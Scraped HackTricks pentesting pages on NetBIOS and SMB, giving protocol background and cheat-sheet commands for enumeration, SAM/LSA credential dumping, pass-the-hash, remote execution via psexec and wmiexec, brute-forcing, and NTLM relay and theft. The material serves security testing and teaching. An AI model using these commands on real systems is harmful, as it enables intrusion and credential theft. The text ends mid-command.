        "text": "137,138,139 - Pentesting NetBios\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetBios Name Service\nName service for name registration and resolution (ports: 137/udp and 137/tcp).\nDatagram distribution service for connectionless communication (port: 138/udp).\nSession service for connection-oriented communication (port: 139/tcp).\nName Service\nEvery machine should have a name inside the NetBios network. To request a name, a machine should send a \"Name Query\" packet in broadcast and if anyone answer that it is already using that name, the machine can use that name. If there is a Name Service server, the computer could ask the Name Service server if someone is using the name that it wants to use.\nTo discover the IP address of a Name, a PC has to send a \"Name Query\" packet and wait if anyone answers. If there is a Name Service server, the PC can ask it for the IP of the name.\nPORT    STATE SERVICE    VERSION\n137\n/udp\nopen\nnetbios-ns Samba nmbd netbios-ns\n(\nworkgroup: WORKGROUP\n)\nEnumerating a NetBIOS service you can obtain the names the server is using and the MAC address of the server.\nnmblookup\n-A\n<\nIP\n>\nnbtscan\n<\nIP\n>\n/30\nsudo\nnmap\n-sU\n-sV\n-T4\n--script\nnbstat.nse\n-p137\n-Pn\n-n\n<\nIP\n>\nDatagram Distribution Service\nNetBIOS datagrams are sent over UDP. A datagram is sent with a \"Direct Unique\" or \"Direct Group\" packet if it's being sent to a particular NetBIOS name, or a \"Broadcast\" packet if it's being sent to all NetBIOS names on the network.\nPORT    STATE         SERVICE     VERSION\n138\n/udp\nopen\n|\nfiltered netbios-dgm\nSession Service\nSession mode lets two computers establish a connection for a \"conversation\", allows larger messages to be handled, and provides error detection and recovery.\nSessions are established by exchanging packets. The computer establishing the session attempts to make a\nTCP\nconnection to port 139 on the computer with which the session is to be established. If the connection is made, the computer establishing the session then sends over the connection a \"Session Request\" packet with the NetBIOS names of the application establishing the session and the NetBIOS name to which the session is to be established. The computer with which the session is to be established will respond with a \"Positive Session Response\" indicating that a session can be established or a \"Negative Session Response\" indicating that no session can be established (either because that computer isn't listening for sessions being established to that name or because no resources are available to establish a session to that name).\nData is transmitted during an established session by Session Message packets.\nTCP handles flow control and retransmission of all session service packets, and the dividing of the data stream over which the packets are transmitted into\nIP\ndatagrams small enough to fit in link-layer packets.\nSessions are closed by closing the TCP connection.\nPORT      STATE SERVICE      VERSION\n139\n/tcp\nopen\nnetbios-ssn  Microsoft Windows netbios-ssn\nRead the next page to learn how to enumerate this service:\n137,138,139 - Pentesting NetBios\nHackTricks Automatic Commands\nProtocol_Name: Netbios    #Protocol Abbreviation if there is one.\nPort_Number:  137,138,139     #Comma separated if there is more than one.\nProtocol_Description: Netbios         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for NetBios\nNote: |\nName service for name registration and resolution (ports: 137/udp and 137/tcp).\nDatagram distribution service for connectionless communication (port: 138/udp).\nSession service for connection-oriented communication (port: 139/tcp).\n‚Äã\nEvery machine should have a name inside the NetBios network. To request a name, a machine should send a \"Name Query\" packet in broadcast and if anyone answer that it is already using that name, the machine can use that name. If there is a Name Service server, the computer could ask the Name Service server if someone is using the name that it wants to use.\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/137-138-139-pentesting-netbios\n‚Äã\nEntry_2:\nName: Find Names\nDescription: Three scans to find the names of the server\nCommand: nmblookup -A {IP} &&&& nbtscan {IP}/30 &&&& nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n {IP}\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nNetwork Services Pentesting -\nPrevious\n135, 593 - Pentesting MSRPC\nNext\n- Network Services Pentesting\n139,445 - Pentesting SMB\nLast modified\n6mo ago"
    },
    {
        "title": "139,445 - Pentesting SMB",
        "url": "https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb",
        "text": "139,445 - Pentesting SMB\n139,445 - Pentesting SMB\n‚Äã\n‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è\n-\nüê¶ Twitter üê¶\n-\nüéôÔ∏è Twitch üéôÔ∏è\n-\nüé• Youtube üé•\n‚Äã\nDo you work in a\ncybersecurity company\n? Do you want to see your\ncompany advertised in HackTricks\n? or do you want to have access to the\nlatest version of the PEASS or download HackTricks in PDF\n? Check the\nSUBSCRIPTION PLANS\n!\nDiscover\nThe PEASS Family\n, our collection of exclusive\nNFTs\n‚Äã\nGet the\nofficial PEASS & HackTricks swag\n‚Äã\nJoin the\nüí¨\nDiscord group\nor the\ntelegram group\nor\nfollow\nme on\nTwitter\nüê¶\n‚Äã\n@carlospolopm\n.\nShare your hacking tricks by submitting PRs to the\nhacktricks repo\nand\nhacktricks-cloud repo\n.\nPort 139\nNetBIOS\nstands for\nNetwork Basic Input Output System\n. It is a software protocol that allows applications, PCs, and Desktops on a local area network (LAN) to communicate with network hardware and to transmit data across the network. Software applications that run on a NetBIOS network locate and identify each other via their NetBIOS names. A NetBIOS name is up to 16 characters long and usually, separate from the computer name. Two applications start a NetBIOS session when one (the client) sends a command to ‚Äúcall‚Äù another client (the server) over\nTCP Port 139\n. (extracted from\nhere\n)\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\nPort 445\nWhile Port 139 is known technically as ‚ÄòNBT over IP‚Äô, Port 445 is ‚ÄòSMB over IP‚Äô.\nSMB\nstands for ‚Äò\nServer Message Blocks\n‚Äô. Server Message Block in modern language is also known as\nCommon Internet File System\n. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.\nFor instance, on Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445. On other systems, you‚Äôll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP**.** (extracted from\nhere\n)\n445/tcp   open  microsoft-ds  Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)\nSMB\nServer Message Block (\nSMB\n) is a\nclient-server\nprotocol that regulates\naccess to files\nand entire directories and other network resources such as printers, routers, or interfaces released for the network. The main application area of the protocol has been the\nWindows\noperating system series in particular, whose network services support SMB in a downward-compatible manner - which means that devices with newer editions can easily communicate with devices that have an older Microsoft operating system installed.\nWith the free software project\nSamba\n, there is also a solution that enables the use of\nSMB in Linux\nand Unix distributions and thus cross-platform communication via SMB.\nAn SMB server can provide\narbitrary parts of its local file system as shares\n. Therefore the\nhierarchy visible\nto a client is partially\nindependent\nof the\nstructure\non the\nserver\n.\nAccess rights\nare defined by\nAccess Control Lists\n(\nACL\n). They can be controlled in a\nfine-grained manner\nbased on attributes such as\nexecute\n,\nread\n, and\nfull access\nfor individual users or user groups. The\nACLs\nare defined\nbased on the shares\nand therefore do not correspond to the rights assigned locally on the server.\nIPC$ share\nFrom book\nNetwork Security Assessment 3rd edition\nWith an anonymous null session you can access the IPC$ share and interact with services exposed via named pipes. The enum4linux utility within Kali Linux is particularly useful; with it, you can obtain the following:\nOperating system information\nDetails of the parent domain\nA list of local users and groups\nDetails of available SMB shares\nThe effective system security policy\nWhat is NTLM\nIf you don't know what is NTLM or you want to know how it works and how to abuse it, you will find very interesting this page about\nNTLM\nwhere is explained\nhow this protocol works and how you can take advantage of it:\nNTLM\nServer Enumeration\nScan\na network searching for hosts:\nnbtscan\n-r\n192.168\n.0.1/24\nSMB server version\nTo look for possible exploits to the SMB version it important to know which version is being used. If this information does not appear in other used tools, you can:\nUse the\nMSF\nauxiliary module _\nauxiliary/scanner/smb/smb_version\nOr this script:\n#!/bin/sh\n#Author: rewardone\n#Description:\n# Requires root or enough permissions to use tcpdump\n# Will listen for the first 7 packets of a null login\n# and grab the SMB Version\n#Notes:\n# Will sometimes not capture or will print multiple\n# lines. May need to run a second time for success.\nif\n[\n-z\n$1\n];\nthen\necho\n\"Usage: ./smbver.sh RHOST {RPORT}\"\n&&\nexit\n;\nelse\nrhost\n=\n$1\n;\nfi\nif\n[\n!\n-z\n$2\n];\nthen\nrport\n=\n$2\n;\nelse\nrport\n=\n139\n;\nfi\ntcpdump\n-s0\n-n\n-i\ntap0 src\n$rhost\nand port\n$rport\n-A\n-c\n7\n2\n>\n/dev/null\n|\ngrep\n-i\n\"samba\\|s.a.m\"\n|\ntr\n-d\n'.'\n|\ngrep\n-oP\n'UnixSamba.*[0-9a-z]'\n|\ntr\n-d\n'\\n'\n&\necho\n-n\n\"\n$rhost\n: \"\n&\necho\n\"exit\"\n|\nsmbclient\n-L\n$rhost\n1\n>\n/dev/null\n2\n>\n/dev/null\necho\n\"\"\n&&\nsleep\n.1\nSearch exploit\nmsf\n>\nsearch type:exploit platform:windows target:2008 smb\nsearchsploit microsoft smb\nPossible\nCredentials\nUsername(s)\nCommon passwords\n(blank)\n(blank)\nguest\n(blank)\nAdministrator, admin\n(blank)\n, password, administrator, admin\narcserve\narcserve, backup\ntivoli, tmersrvd\ntivoli, tmersrvd, admin\nbackupexec, backup\nbackupexec, backup, arcada\ntest, lab, demo\npassword, test, lab, demo\nSMB Environment Information\nObtain Information\n#Dump interesting information\nenum4linux\n-a\n[\n-u\n\"<username>\"\n-p\n\"<passwd>\"\n]\n<\nIP\n>\nenum4linux-ng\n-A\n[\n-u\n\"<username>\"\n-p\n\"<passwd>\"\n]\n<\nIP\n>\nnmap\n--script\n\"safe or smb-enum-*\"\n-p\n445\n<\nIP\n>\n‚Äã\n#Connect to the rpc\nrpcclient\n-U\n\"\"\n-N\n<\nIP\n>\n#No creds\nrpcclient //machine.htb\n-U\ndomain.local/USERNAME%754d87d42adabcca32bdb34a876cbffb  --pw-nt-hash\nrpcclient\n-U\n\"username%passwd\"\n<\nIP\n>\n#With creds\n#You can use querydispinfo and enumdomusers to query user information\n‚Äã\n#Dump user information\n/usr/share/doc/python3-impacket/examples/samrdump.py\n-port\n139\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n/usr/share/doc/python3-impacket/examples/samrdump.py\n-port\n445\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n‚Äã\n#Map possible RPC endpoints\n/usr/share/doc/python3-impacket/examples/rpcdump.py\n-port\n135\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n/usr/share/doc/python3-impacket/examples/rpcdump.py\n-port\n139\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n/usr/share/doc/python3-impacket/examples/rpcdump.py\n-port\n445\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\nEnumerate Users, Groups & Logged On Users\nThis info should already being gathered from enum4linux and enum4linux-ng\ncrackmapexec smb\n10.10\n.10.10\n--users\n[\n-u\n<\nusername\n>\n-p\n<\npassword\n>\n]\ncrackmapexec smb\n10.10\n.10.10\n--groups\n[\n-u\n<\nusername\n>\n-p\n<\npassword\n>\n]\ncrackmapexec smb\n10.10\n.10.10\n--groups\n--loggedon-users\n[\n-u\n<\nusername\n>\n-p\n<\npassword\n>\n]\n‚Äã\nldapsearch\n-x\n-b\n\"DC=DOMAIN_NAME,DC=LOCAL\"\n-s\nsub\n\"(&(objectclass=user))\"\n-h\n10.10\n.10.10\n|\ngrep\n-i\nsamaccountname:\n|\ncut\n-f\n2\n-d\n\" \"\n‚Äã\nrpcclient\n-U\n\"\"\n-N\n10.10\n.10.10\nenumdomusers\nenumdomgroups\nEnumerate local users\n‚Äã\nImpacket\n‚Äã\nlookupsid.py -no-pass hostname.local\nOneliner\nfor\ni\nin\n$(\nseq\n500\n1100\n)\n;\ndo\nrpcclient\n-N\n-U\n\"\"\n10.10\n.10.10\n-c\n\"queryuser 0x\n$(\nprintf\n'%x\\n'\n$i\n)\n\"\n|\ngrep\n\"User Name\\|user_rid\\|group_rid\"\n&&\necho\n\"\"\n;\ndone\nMetasploit - Enumerate local users\nuse auxiliary/scanner/smb/smb_lookupsid\nset\nrhosts hostname.local\nrun\nEnumerating LSARPC and SAMR rpcclient\nrpcclient enumeration\nGUI connection from linux\nIn the terminal:\nxdg-open smb://cascade.htb/\nIn file browser window (nautilus, thunar, etc)\nsmb://friendzone.htb/general/\nShared Folders Enumeration\nList shared folders\nIt is always recommended to look if you can access to anything, if you don't have credentials try using\nnull\ncredentials/guest user\n.\nsmbclient --no-pass\n-L\n//\n<\nIP\n>\n# Null user\nsmbclient\n-U\n'username[%passwd]'\n-L\n[\n--pw-nt-hash\n]\n//\n<\nIP\n>\n#If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n‚Äã\nsmbmap\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n#Null user\nsmbmap\n-u\n\"username\"\n-p\n\"password\"\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n#Creds\nsmbmap\n-u\n\"username\"\n-p\n\"<NT>:<LM>\"\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n#Pass-the-Hash\nsmbmap\n-R\n-u\n\"username\"\n-p\n\"password\"\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n#Recursive list\n‚Äã\ncrackmapexec smb\n<\nIP\n>\n-u\n''\n-p\n''\n--shares\n#Null user\ncrackmapexec smb\n<\nIP\n>\n-u\n'username'\n-p\n'password'\n--shares\n#Guest user\ncrackmapexec smb\n<\nIP\n>\n-u\n'username'\n-H\n'<HASH>'\n--shares\n#Guest user\nConnect/List a shared folder\n#Connect using smbclient\nsmbclient --no-pass //\n<\nIP\n>\n/\n<\nFolder\n>\nsmbclient\n-U\n'username[%passwd]'\n-L\n[\n--pw-nt-hash\n]\n//\n<\nIP\n>\n#If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash\n#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient\n‚Äã\n#List with smbmap, without folder it list everything\nsmbmap\n[\n-u\n\"username\"\n-p\n\"password\"\n]\n-R\n[\nFolder\n]\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n# Recursive list\nsmbmap\n[\n-u\n\"username\"\n-p\n\"password\"\n]\n-r\n[\nFolder\n]\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n# Non-Recursive list\nsmbmap\n-u\n\"username\"\n-p\n\"<NT>:<LM>\"\n[\n-r/-R\n]\n[\nFolder\n]\n-H\n<\nIP\n>\n[\n-P\n<\nPORT\n>\n]\n#Pass-the-Hash\nManually enumerate windows shares and connect to them\nIt may be possible that you are restricted to display any shares of the host machine and when you try to list them it appears as if there aren't any shares to connect to. Thus it might be worth a short to try to manually connect to a share. To enumerate the shares manually you might want to look for responses like NT_STATUS_ACCESS_DENIED and NT_STATUS_BAD_NETWORK_NAME, when using a valid session (e.g. null session or valid credentials). These may indicate whether the share exists and you do not have access to it or the share does not exist at all.\nCommon share names for windows targets are\nC$\nD$\nADMIN$\nIPC$\nPRINT$\nFAX$\nSYSVOL\nNETLOGON\n(Common share names from\nNetwork Security Assessment 3rd edition\n)\nYou can try to connect to them by using the following command\nsmbclient\n-U\n'%'\n-N\n\\\\\\\\\n<\nIP\n>\n\\\\\n<\nSHARE\n>\n# null session to connect to a windows share\nsmbclient\n-U\n'<USER>'\n\\\\\\\\\n<\nIP\n>\n\\\\\n<\nSHARE\n>\n# authenticated session to connect to a windows share (you will be prompted for a password)\nor this script (using a null session)\n#/bin/bash\n‚Äã\nip\n=\n'<TARGET-IP-HERE>'\nshares\n=\n(\n'C$'\n'D$'\n'ADMIN$'\n'IPC$'\n'PRINT$'\n'FAX$'\n'SYSVOL'\n'NETLOGON'\n)\n‚Äã\nfor\nshare\nin\n${shares\n[\n*\n]\n}\n;\ndo\noutput\n=\n$(\nsmbclient\n-U\n'%'\n-N\n\\\\\\\\\n$ip\n\\\\\n$share\n-c\n''\n)\n‚Äã\nif\n[[\n-z\n$output\n]];\nthen\necho\n\"[+] creating a null session is possible for\n$share\n\"\n# no output if command goes through, thus assuming that a session was created\nelse\necho\n$output\n# echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)\nfi\ndone\nexamples\nsmbclient\n-U\n'%'\n-N\n\\\\\\\\\n192.168\n.0.24\n\\\\\nim_clearly_not_here\n# returns NT_STATUS_BAD_NETWORK_NAME\nsmbclient\n-U\n'%'\n-N\n\\\\\\\\\n192.168\n.0.24\n\\\\\nADMIN$\n# returns NT_STATUS_ACCESS_DENIED or even gives you a session\nMount a shared folder\nmount\n-t\ncifs //x.x.x.x/share /mnt/share\nmount\n-t\ncifs\n-o\n\"username=user,password=password\"\n//x.x.x.x/share /mnt/share\nDownload files\nRead previous sections to learn how to connect with credentials/Pass-the-Hash.\n#Search a file and download\nsudo\nsmbmap\n-R\nFolder\n-H\n<\nIP\n>\n-A\n<\nFileName\n>\n-q\n# Search the file in recursive mode and download it inside /usr/share/smbmap\n#Download all\nsmbclient //\n<\nIP\n>\n/\n<\nshare\n>\n>\nmask\n\"\"\n>\nrecurse\n>\nprompt\n>\nmget *\n#Download everything to current directory\nCommands:\nmask: specifies the mask which is used to filter the files within the directory (e.g. \"\" for all files)\nrecurse: toggles recursion on (default: off)\nprompt: toggles prompting for filenames off (default: on)\nmget: copies all files matching the mask from host to client machine\n(\nInformation from the manpage of smbclient\n)\nDomain Shared Folders Search\n‚Äã\nSnaffler\n****\nSnaffler.exe\n-s\n-d\ndomain.local\n-o\nsnaffler.log\n-v\ndata\n‚Äã\nCrackMapExec\nspider.\n-M spider_plus [--share <share_name>]\n--pattern txt\nsudo\ncrackmapexec smb\n10.10\n.10.10\n-u\nusername\n-p\npass\n-M\nspider_plus\n--share\n'Department Shares'\nSpecially interesting from shares are the files called\nRegistry.xml\nas they\nmay contain passwords\nfor users configured with\nautologon\nvia Group Policy. Or\nweb.config\nfiles as they contains credentials.\nThe\nSYSVOL share\nis\nreadable\nby all authenticated users in the domain. In there you may\nfind\nmany different batch, VBScript, and PowerShell\nscripts\n.\nYou should\ncheck\nthe\nscripts\ninside of it as you might\nfind\nsensitive info such as\npasswords\n.\nRead Registry\nYou may be able to\nread the registry\nusing some discovered credentials. Impacket\nreg.py\nallows you to try:\nsudo\nreg.py domain.local/\n[email¬†protected]\n-hashes\n1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query\n-keyName\nHKU\n-s\nsudo\nreg.py domain.local/\n[email¬†protected]\n-hashes\n1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query\n-keyName\nHKCU\n-s\nsudo\nreg.py domain.local/\n[email¬†protected]\n-hashes\n1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query\n-keyName\nHKLM\n-s\nPost Exploitation\nThe\ndefault config of\na\nSamba\nserver is usually located in\n/etc/samba/smb.conf\nand might have some\ndangerous configs\n:\nSetting\nDescription\nbrowseable = yes\nAllow listing available shares in the current share?\nread only = no\nForbid the creation and modification of files?\nwritable = yes\nAllow users to create and modify files?\nguest ok = yes\nAllow connecting to the service without using a password?\nenable privileges = yes\nHonor privileges assigned to specific SID?\ncreate mask = 0777\nWhat permissions must be assigned to the newly created files?\ndirectory mask = 0777\nWhat permissions must be assigned to the newly created directories?\nlogon script = script.sh\nWhat script needs to be executed on the user's login?\nmagic script = script.sh\nWhich script should be executed when the script gets closed?\nmagic output = script.out\nWhere the output of the magic script needs to be stored?\nThe command\nsmbstatus\ngives information about the\nserver\nand about\nwho is connected\n.\nAuthenticate using Kerberos\nYou can\nauthenticate\nto\nkerberos\nusing the tools\nsmbclient\nand\nrpcclient\n:\nsmbclient\n--kerberos\n//ws01win10.domain.com/C$\nrpcclient\n-k\nws01win10.domain.com\nExecute Commands\ncrackmapexec\ncrackmapexec can execute commands\nabusing\nany of\nmmcexec, smbexec, atexec, wmiexec\nbeing\nwmiexec\nthe\ndefault\nmethod. You can indicate which option you prefer to use with the parameter\n--exec-method\n:\napt-get\ninstall\ncrackmapexec\n‚Äã\ncrackmapexec smb\n192.168\n.10.11\n-u\nAdministrator\n-p\n'P@ssw0rd'\n-X\n'$PSVersionTable'\n#Execute Powershell\ncrackmapexec smb\n192.168\n.10.11\n-u\nAdministrator\n-p\n'P@ssw0rd'\n-x\nwhoami\n#Excute cmd\ncrackmapexec smb\n192.168\n.10.11\n-u\nAdministrator\n-H\n<\nNTHASH\n>\n-x\nwhoami\n#Pass-the-Hash\n# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}\n‚Äã\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--sam\n#Dump SAM\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--lsa\n#Dump LSASS in memmory hashes\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--sessions\n#Get sessions (\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--loggedon-users\n#Get logged-on users\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--disks\n#Enumerate the disks\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--users\n#Enumerate users\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--groups\n# Enumerate groups\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--local-groups\n# Enumerate local groups\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--pass-pol\n#Get password policy\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-p\n'password'\n--rid-brute\n#RID brute\n‚Äã\ncrackmapexec smb\n<\nIP\n>\n-d\n<\nDOMAIN\n>\n-u\nAdministrator\n-H\n<\nHASH\n>\n#Pass-The-Hash\n‚Äã\npsexec\n/\nsmbexec\n‚Äã\nBoth options will\ncreate a new service\n(using\n\\pipe\\svcctl\nvia SMB) in the victim machine and use it to\nexecute something\n(\npsexec\nwill\nupload\nan executable file to ADMIN$ share and\nsmbexec\nwill point to\ncmd.exe/powershell.exe\nand put in the arguments the payload --\nfile-less technique-\n-).\nMore info\nabout\npsexec\nand\nsmbexec\n.\nIn\nkali\nit is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./psexec.py\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n./psexec.py\n-hashes\n<\nLM:NT\n>\n[email¬†protected]\n#Pass-the-Hash\npsexec\n\\\\\n192.168\n.122.66\n-u\nAdministrator\n-p\n123456Ww\npsexec\n\\\\\n192.168\n.122.66\n-u\nAdministrator\n-p\nq23q34t34twd3w34t34wtw34t\n# Use pass the hash\nUsing\nparameter\n-k\nyou can authenticate against\nkerberos\ninstead of\nNTLM\n‚Äã\nwmiexec\n/dcomexec\nStealthily execute a command shell without touching the disk or running a new service using DCOM via\nport 135.\nIn\nkali\nit is located on /usr/share/doc/python3-impacket/examples/\n#If no password is provided, it will be prompted\n./wmiexec.py\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n#Prompt for password\n./wmiexec.py\n-hashes\nLM:NT\n[email¬†protected]\n#Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\nUsing\nparameter\n-k\nyou can authenticate against\nkerberos\ninstead of\nNTLM\n#If no password is provided, it will be prompted\n./dcomexec.py\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n./dcomexec.py\n-hashes\n<\nLM:NT\n>\n[email¬†protected]\n#Pass-the-Hash\n#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted\n‚Äã\nAtExec\n‚Äã\nExecute commands via the Task Scheduler (using\n\\pipe\\atsvc\nvia SMB).\nIn\nkali\nit is located on /usr/share/doc/python3-impacket/examples/\n./atexec.py\n[[\ndomain/\n]\nusername\n[\n:password\n]\n@\n]\n<\ntargetName or address\n>\n\"command\"\n./atexec.py\n-hashes\n<\nLM:NT\n>\n[email¬†protected]\n\"whoami\"\nImpacket reference\n‚Äã\nhttps://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/\n‚Äã\nBruteforce users credentials\nThis is not recommended, you could block an account if you exceed the maximum allowed tries\nnmap\n--script\nsmb-brute\n-p\n445\n<\nIP\n>\nridenum.py\n<\nIP\n>\n500\n50000\n/root/passwds.txt\n#Get usernames bruteforcing that rids and then try to bruteforce each user name\nSMB relay attack\nThis attack uses the Responder toolkit to\ncapture SMB authentication sessions\non an internal network, and\nrelays\nthem to a\ntarget machine\n. If the authentication\nsession is successful\n, it will automatically drop you into a\nsystem\nshell\n.\nMore information about this attack here.\n‚Äã\nSMB-Trap\nThe Windows library URLMon.dll automatically try to authenticaticate to the host when a page tries to access some contect via SMB, for example:\nimg src=\"\\\\10.10.10.10\\path\\image.jpg\"\nThis happens with the functions:\nURLDownloadToFile\nURLDownloadToCache\nURLOpenStream\nURLOpenBlockingStream\nWhich are used by some browsers and tools (like Skype)\nFrom: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html\nSMBTrap using MitMf\nFrom: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html\nNTLM Theft\nSimilar to SMB Trapping, planting malicious files onto a target system (via SMB, for example) can illicit an SMB authentication attempt, allowing the NetNTLMv2 hash to be intercepted with a tool such as Responder. The hash can then be cracked offline or used in an\nSMB relay attack\n.\n‚Äã\nSee: ntlm_theft\n‚Äã\nHackTricks Automatic Commands\nProtocol_Name: SMB    #Protocol Abbreviation if there is one.\nPort_Number:  137,138,139     #Comma separated if there is more than one.\nProtocol_Description: Server Message Block         #Protocol Abbreviation Spelled out\n‚Äã\nEntry_1:\nName: Notes\nDescription: Notes for SMB\nNote: |\nWhile Port 139 is known technically as ‚ÄòNBT over IP‚Äô, Port 445 is ‚ÄòSMB over IP‚Äô. SMB stands for ‚ÄòServer Message Blocks‚Äô. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.\n‚Äã\n#These are the commands I run in order every time I see an open SMB port\n‚Äã\nWith No Creds\nnbtscan {IP}\nsmbmap -H {IP}\nsmbmap -H {IP} -u null -p null\nsmbmap -H {IP} -u guest\nsmbclient -N -L //{IP}\nsmbclient -N //{IP}/ --option=\"client min protocol\"=LANMAN1\nrpcclient {IP}\nrpcclient -U \"\" {IP}\ncrackmapexec smb {IP}\ncrackmapexec smb {IP} --pass-pol -u \"\" -p \"\"\ncrackmapexec smb {IP} --pass-pol -u \"guest\" -p \"\"\nGetADUsers.py -dc-ip {IP} \"{Domain_Name}/\" -all\nGetNPUsers.py -dc-ip {IP} -request \"{Domain_Name}/\" -format hashcat\nGetUserSPNs.py -dc-ip {IP} -request \"{Domain_Name}/\"\ngetArch.py -target {IP}\n‚Äã\nWith Creds\nsmbmap -H {IP} -u {Username} -p {Password}\nsmbclient \"\\\\\\\\{IP}\\\\\\\" -U {Username} -W {Domain_Name} -l {IP}\nsmbclient \"\\\\\\\\{IP}\\\\\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`\ncrackmapexec smb {IP} -u {Username} -p {Password} --shares\nGetADUsers.py {Domain_Name}/{Username}:{Password} -all\nGetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat\nGetUserSPNs.py {Domain_Name}/{Username}:{Password} -request\n‚Äã\nhttps://book.hacktricks.xyz/pentesting/pentesting-smb\n‚Äã\nEntry_2:\nName: Enum4Linux\nDescription: General SMB Scan\nCommand: enum4linux -a {IP}\n‚Äã\nEntry_3:\nName: Nmap SMB Scan 1\nDescription: SMB Vuln Scan With Nmap\nCommand: nmap -p 139,445 -vv -Pn 